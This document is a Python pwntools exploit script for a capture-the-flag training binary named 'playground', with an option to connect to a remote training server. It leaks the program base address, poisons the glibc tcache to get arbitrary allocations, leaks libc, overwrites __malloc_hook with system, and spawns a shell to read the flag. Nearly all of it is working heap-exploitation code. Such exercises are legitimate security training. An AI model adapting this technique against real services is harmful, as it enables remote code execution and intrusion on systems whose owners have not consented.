from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./playground")
        gdb.attach(p, """
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./playground"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 4110)
else:
    p = process("./playground")

libc = ELF("./libc-2.27.so")
exe = ELF("./playground")

def malloc(n):
    p.recvuntil(b'> ')
    p.sendline(b'malloc %d' % n)
    p.recvuntil(b'==> ')
    return int(p.recvuntil(b'\n')[2:-1].decode('utf-8'), 16)

def free(ptr):
    p.recvuntil(b'> ')
    p.sendline(b'free %d' % ptr)
    p.recvuntil(b'==> ok')

def write(ptr, n, what):
    p.recvuntil(b'> ')
    p.sendline(b'write %d %d' % (ptr, n))
    p.recvuntil(b'==> read')
    p.send(what)

def show(ptr, n):
    p.recvuntil(b'> ')
    p.sendline(b'show %d %d' % (ptr, n))
    for i in range(n-1):
        p.recvuntil(b'\n')
    p.recvuntil(b':   ')
    return int(p.recvuntil(b'\n')[:-1], 16)

# Leak PID and Main
p.recvuntil(b'pid: ')
pid = int(p.recvuntil(b'\n')[:-1])
p.recvuntil(b'main: ')
main = int(p.recvuntil(b'\n')[:-1], 16)
exe.address = main - 0x11d9

print("[!] PID: %d" % pid)
print("[!] leak main: %#x" % main)
print("[!] exe base address: %#x" % exe.address)
print("[!] min_heap address: %#x" % exe.symbols.min_heap)

size = 0x70
a = malloc(size)
b = malloc(size)

free(a)
free(b)

target = exe.symbols.min_heap - 0x8
write(b, 8, p64(target))

malloc(size)

input('step 2')

arbitrary = malloc(size)

print('Arbitrary (min_heap): %#x' % arbitrary)
#print('min_heap value %#x' % show(arbitrary, 2))

write(arbitrary, 8, p64(0x7fffffffffffffff))

# Leak Libc - easy just allocate something that DO NOT go into a tcache bin
a = malloc(0x570)
b = malloc(0x570)

free(a)
leak_libc = show(a, 1)
libc.address = leak_libc - 4111520
print("[!] leak libc: %#x" % leak_libc)
print("[!] libc: %#x" % libc.address)

input('second part')

size = 0x60

a = malloc(size)
b = malloc(size)

free(a)
free(b)

target = libc.symbols.__malloc_hook
write(b, 8, p64(target))

malloc(size)

input('step 2')

arbitrary = malloc(size)
print('Arbitrary Malloc', hex(arbitrary))

write(arbitrary, 8, p64(libc.symbols.system))

binsh = next(libc.search(b'/bin/sh\x00'))

p.recvuntil(b'> ')
p.sendline(b'malloc %d' % binsh)

p.sendline(b'cat flag')

p.interactive()